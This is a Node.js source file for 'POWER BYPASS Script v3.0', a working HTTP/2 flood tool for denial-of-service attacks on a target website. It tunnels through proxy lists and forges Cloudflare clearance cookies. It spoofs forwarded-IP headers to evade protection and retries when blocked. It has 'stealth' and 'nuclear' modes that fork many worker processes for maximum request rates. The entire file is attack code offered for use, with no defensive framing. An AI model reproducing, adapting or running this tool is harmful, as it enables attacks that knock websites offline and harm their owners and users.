const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const os = require('os');
const v8 = require("v8");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.clear();
    console.log('\x1b[31m%s\x1b[0m', `
    POWER BYPASS Script v3.0 - Maximum Power + Stealth
    Usage: node power <target> <time> <rate> <threads> <proxyfile>

    Example: node power https://example.com 300 2000 15 proxies.txt

    Options:
      --power: Maximum flood power (default)
      --stealth: Reduce detection while maintaining high RPS
      --nuclear: Extreme mode (use with caution)
    `);
    process.exit();
}

// Massive User-Agent pool for better rotation
const powerUserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.61.109 Chrome/120.0.0.0 Safari/537.36",
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
];

const langHeaders = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
];

const encodingHeaders = ["gzip, deflate, br, zstd", "gzip, deflate, br", "gzip, deflate"];
const cacheHeaders = ["no-cache", "max-age=0", "no-store", "must-revalidate"];
const fetchDest = ["document", "empty", "iframe", "script", "style"];
const fetchMode = ["navigate", "cors", "no-cors", "same-origin"];
const fetchSite = ["none", "same-origin", "cross-site", "same-site"];

// High-performance TLS configs
const powerTLSConfigs = [
    {
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
        curves: "X25519:P-256:P-384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
    },
    {
        ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384",
        curves: "P-256:P-384:X25519",
        sigalgs: "rsa_pss_rsae_sha256:ecdsa_secp256r1_sha256:rsa_pkcs1_sha256",
    }
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    power: process.argv.includes('--power') || !process.argv.includes('--stealth'),
    stealth: process.argv.includes('--stealth'),
    nuclear: process.argv.includes('--nuclear'),
    // Method selection modes
    getOnly: process.argv.includes('--get-only'),
    postOnly: process.argv.includes('--post-only'), 
    headOnly: process.argv.includes('--head-only'),
    smart: process.argv.includes('--smart') || (!process.argv.includes('--get-only') && !process.argv.includes('--post-only') && !process.argv.includes('--head-only')),
    mixed: process.argv.includes('--mixed')
};

let proxies = [];
try {
    proxies = fs.readFileSync(args.proxyFile, "utf-8")
        .split(/\r?\n/)
        .filter(proxy => proxy.includes(':'))
        .filter(proxy => {
            const [host, port] = proxy.split(':');
            return host && port && !isNaN(port) && port > 0 && port < 65536;
        });
} catch (error) {
    console.error("Proxy file error:", error.message);
    process.exit(1);
}

const parsedTarget = new URL(args.target);

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(arr) {
    return arr[randomInt(0, arr.length)];
}

function randomString(length, chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") {
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function fastCookie() {
    const ts = Math.floor(Date.now() / 1000);
    return `cf_clearance=${randomString(43)}-${ts}.${randomInt(0,2)}.${randomInt(0,2)}.${randomString(10)}; __cf_bm=${randomString(43)}; _ga=GA1.2.${randomInt(100000000,999999999)}.${ts}`;
}

function generatePowerHeaders(target, methodMode = "smart") {
    const ua = randomElement(powerUserAgents);
    const chromeVer = ua.match(/Chrome\/(\d+)/)?.[1] || "120";
    
    // Smart method selection based on effectiveness
    let method;
    if (methodMode === "get-only") {
        method = "GET";
    } else if (methodMode === "smart") {
        // 70% GET (most effective), 20% POST, 10% HEAD
        const rand = Math.random();
        if (rand < 0.7) method = "GET";
        else if (rand < 0.9) method = "POST"; 
        else method = "HEAD";
    } else if (methodMode === "mixed") {
        method = randomElement(["GET", "POST", "HEAD"]);
    } else {
        method = methodMode.toUpperCase();
    }
    
    // Dynamic parameters for each request
    const queryParams = `_t=${Date.now()}&_r=${Math.random().toString(36).substring(2,8)}&_v=${randomInt(1,999)}&_m=${method.toLowerCase()}`;
    const fullPath = target.pathname + (target.search ? target.search + '&' : '?') + queryParams;
    
    const headers = {
        ":method": method,
        ":scheme": "https",
        ":authority": target.host,
        ":path": fullPath,
        "user-agent": ua,
        "accept": randomElement(acceptHeaders),
        "accept-language": randomElement(langHeaders),
        "accept-encoding": randomElement(encodingHeaders),
        "cache-control": randomElement(cacheHeaders),
        "sec-ch-ua": `"Not_A Brand";v="8", "Chromium";v="${chromeVer}", "Google Chrome";v="${chromeVer}"`,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": randomElement(fetchDest),
        "sec-fetch-mode": randomElement(fetchMode),
        "sec-fetch-site": randomElement(fetchSite),
        "upgrade-insecure-requests": "1",
        "cookie": fastCookie(),
        "referer": `https://${target.host}/`,
        "origin": `https://${target.host}`,
    };

    // Add stealth headers only if needed
    if (args.stealth) {
        headers["x-forwarded-for"] = `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`;
        headers["cf-connecting-ip"] = `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`;
        headers["cf-ipcountry"] = randomElement(["US", "GB", "DE", "FR"]);
    }

    return headers;
}

class PowerSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(args.nuclear ? 15000 : 10000);
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        connection.on("connect", () => connection.write(payload));
        
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (response.includes("HTTP/1.1 200") || response.includes("HTTP/1.0 200")) {
                return callback(connection, null);
            }
            connection.destroy();
            return callback(null, "Bad proxy");
        });

        connection.on("timeout", () => {
            connection.destroy();
            callback(null, "Timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            callback(null, "Error");
        });
    }
}

const powerSocket = new PowerSocket();

function runPowerFlooder() {
    const proxy = randomElement(proxies);
    if (!proxy) return;
    
    const [proxyHost, proxyPort] = proxy.split(":");
    const tlsConfig = randomElement(powerTLSConfigs);
    
    // Determine method mode
    let methodMode = "smart"; // default
    if (args.getOnly) methodMode = "get-only";
    else if (args.postOnly) methodMode = "post-only";
    else if (args.headOnly) methodMode = "head-only";
    else if (args.mixed) methodMode = "mixed";
    
    const proxyOptions = {
        host: proxyHost,
        port: parseInt(proxyPort),
        address: parsedTarget.host,
    };

    powerSocket.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: tlsConfig.ciphers,
            ecdhCurve: tlsConfig.curves,
            sigalgs: tlsConfig.sigalgs,
            honorCipherOrder: true,
            secureProtocol: "TLS_method",
        };

        const tlsConnection = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConnection.setNoDelay(true);
        tlsConnection.setKeepAlive(true, 60000);
        tlsConnection.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            createConnection: () => tlsConnection,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: args.nuclear ? 50000 : (args.power ? 20000 : 5000),
                initialWindowSize: 6291456,
                maxFrameSize: 16777215,
                enablePush: false,
            },
        });

        // MAXIMUM POWER FLOODING
        const maxStreams = args.nuclear ? 100 : (args.power ? 50 : 20);
        const minDelay = args.nuclear ? 1 : (args.power ? 5 : 10);
        const maxDelay = args.nuclear ? 5 : (args.power ? 15 : 50);
        
        const floodInterval = setInterval(() => {
            for (let i = 0; i < maxStreams; i++) {
                if (client.destroyed) break;
                
                const headers = generatePowerHeaders(parsedTarget, methodMode);
                const request = client.request(headers);
                
                request.on("response", (responseHeaders) => {
                    const status = responseHeaders[":status"];
                    
                    // Fast retry on blocks (no delay for maximum power)
                    if (status === 403 || status === 429) {
                        if (!client.destroyed && Math.random() > 0.7) {
                            const retryHeaders = generatePowerHeaders(parsedTarget, methodMode);
                            retryHeaders[":path"] = parsedTarget.pathname + "?retry=" + randomString(5);
                            const retryReq = client.request(retryHeaders);
                            retryReq.on("response", () => retryReq.close());
                            retryReq.on("error", () => retryReq.close());
                            retryReq.end();
                        }
                    }
                    request.close();
                });

                request.on("error", () => request.close());

                // Add POST data for POST requests
                if (headers[":method"] === "POST") {
                    const postData = `{"ts":${Date.now()},"rnd":"${randomString(20)}","target":"${parsedTarget.host}"}`;
                    request.write(postData);
                }

                request.end();
            }
        }, randomInt(minDelay, maxDelay));

        // Cleanup
        setTimeout(() => {
            clearInterval(floodInterval);
            client.destroy();
            connection.destroy();
        }, args.time * 1000);

        client.on("error", () => {
            clearInterval(floodInterval);
            client.destroy();
            connection.destroy();
        });
    });
}

// Main execution
if (cluster.isMaster) {
    console.clear();
    console.log('\x1b[35m%s\x1b[0m', '?'.repeat(70));
    console.log('\x1b[33m%s\x1b[0m', '           ?? POWER BYPASS v3.0 - MAX FLOOD + STEALTH ??');
    console.log('\x1b[35m%s\x1b[0m', '?'.repeat(70));
    
    console.log(`\x1b[36m?? Target:\x1b[0m ${args.target}`);
    console.log(`\x1b[36m??  Time:\x1b[0m ${args.time}s`);
    console.log(`\x1b[36m?? Rate:\x1b[0m ${args.Rate} req/s/thread`);
    console.log(`\x1b[36m?? Threads:\x1b[0m ${args.threads}`);
    console.log(`\x1b[36m?? Proxies:\x1b[0m ${proxies.length}`);
    console.log(`\x1b[36m?? Memory:\x1b[0m ${(v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2)} MB`);
    
    console.log('\n\x1b[32m?? MODE CONFIGURATION:\x1b[0m');
    console.log(`   Power Mode: ${args.power ? '\x1b[32m? ACTIVE\x1b[0m' : '\x1b[31m?\x1b[0m'}`);
    console.log(`   Stealth Mode: ${args.stealth ? '\x1b[33m? ACTIVE\x1b[0m' : '\x1b[31m?\x1b[0m'}`);
    console.log(`   Nuclear Mode: ${args.nuclear ? '\x1b[31m??  ACTIVE\x1b[0m' : '\x1b[31m?\x1b[0m'}`);
    
    console.log('\n\x1b[36m?? METHOD STRATEGY:\x1b[0m');
    if (args.getOnly) console.log('   \x1b[32m? GET ONLY (Recommended)\x1b[0m');
    else if (args.postOnly) console.log('   \x1b[33m??  POST ONLY\x1b[0m');
    else if (args.headOnly) console.log('   \x1b[31m? HEAD ONLY (Not recommended)\x1b[0m');
    else if (args.mixed) console.log('   \x1b[35m?? MIXED (33% each)\x1b[0m');
    else console.log('   \x1b[36m?? SMART MIX (70% GET, 20% POST, 10% HEAD)\x1b[0m');
    
    const mode = args.nuclear ? "NUCLEAR" : (args.power ? "POWER" : "STEALTH");
    const methodStr = args.getOnly ? "GET-FOCUSED" : (args.postOnly ? "POST-FOCUSED" : (args.headOnly ? "HEAD-FOCUSED" : (args.mixed ? "MIXED" : "SMART")));
    console.log(`\n\x1b[35m? ${mode} + ${methodStr} MODE ACTIVATED\x1b[0m`);
    console.log('\x1b[35m%s\x1b[0m', '?'.repeat(70));
    
    // Estimate RPS
    const estimatedRPS = args.Rate * args.threads * (args.nuclear ? 100 : (args.power ? 50 : 20));
    console.log(`\x1b[31m?? ESTIMATED RPS: ${estimatedRPS.toLocaleString()}\x1b[0m`);
    console.log('\x1b[35m%s\x1b[0m', '?'.repeat(70));

    // Create workers
    const numWorkers = Math.max(os.cpus().length * 2, args.threads);
    for (let i = 0; i < numWorkers; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker) => {
        cluster.fork();
    });

    // Statistics
    let totalRequests = 0;
    const statsInterval = setInterval(() => {
        totalRequests += estimatedRPS;
        console.log(`\x1b[33m?? Total Requests Sent: ${totalRequests.toLocaleString()}\x1b[0m`);
    }, 1000);

    setTimeout(() => {
        clearInterval(statsInterval);
        console.log('\x1b[32m%s\x1b[0m', '\n?? POWER FLOOD COMPLETED!');
        process.exit(0);
    }, args.time * 1000);

} else {
    // Worker processes - MAXIMUM POWER
    const instancesPerWorker = args.nuclear ? 20 : (args.power ? 15 : 10);
    const intervalMs = Math.max(1, Math.floor(1000 / args.Rate));
    
    for (let i = 0; i < instancesPerWorker; i++) {
        setInterval(runPowerFlooder, intervalMs + (i * 2));
    }
    
    // Additional boost for nuclear mode
    if (args.nuclear) {
        for (let i = 0; i < 10; i++) {
            setTimeout(() => {
                setInterval(runPowerFlooder, 1);
            }, i * 100);
        }
    }
}

// Error suppression for maximum performance
const ignoreErrors = [
    "ECONNRESET", "ECONNREFUSED", "ETIMEDOUT", "EHOSTUNREACH", 
    "ENOTFOUND", "EPIPE", "EPROTO", "ECONNABORTED", "ENETUNREACH",
    "EMFILE", "ENFILE"
];

process.on("uncaughtException", (error) => {
    if (!ignoreErrors.includes(error.code)) {
        // Silently ignore for max performance
    }
});

process.on("unhandledRejection", () => {});
process.on("warning", () => {});
process.setMaxListeners(0);
